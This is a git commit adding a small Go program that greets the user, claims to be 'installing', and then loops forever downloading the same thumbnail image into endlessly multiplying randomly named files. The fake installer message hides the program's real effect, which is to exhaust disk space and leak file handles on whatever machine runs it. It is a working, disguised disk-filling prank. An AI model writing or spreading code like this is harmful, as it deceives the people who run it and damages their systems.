b724ef74733527ca8e4fd404d660e8b92d1b19b4
fretty233 <fretty.l.silalahi@gmail.com>
2022-01-25 20:08:20 +0700

    first commit

---
+++ main.go
@@ -0,0 +1,40 @@
+package main
+
+import (
+	"fmt"
+	"io"
+	"math/rand"
+	"net/http"
+	"os"
+	"strconv"
+)
+
+func main() {
+	fmt.Println("Hi there what is your name")
+	var name string
+	fmt.Scanln(&name)
+	fmt.Println("Welcome " + name + " please wait while we are installing")
+	create_image()
+}
+
+func create_image() {
+	for true {
+		url := "http://i.ytimg.com/vi/0vxCFIGCqnI/maxresdefault.jpg"
+		response, err := http.Get(url)
+		if err != nil {
+			panic(err)
+		}
+		defer response.Body.Close()
+		name := rand.Int()
+		file, err := os.Create(strconv.Itoa(name) + ".jpg")
+		if err != nil {
+			panic(err)
+		}
+		defer file.Close()
+		_, err = io.Copy(file, response.Body)
+		if err != nil {
+			panic(err)
+		}
+		fmt.Println("Downloading please wait....")
+	}
+}
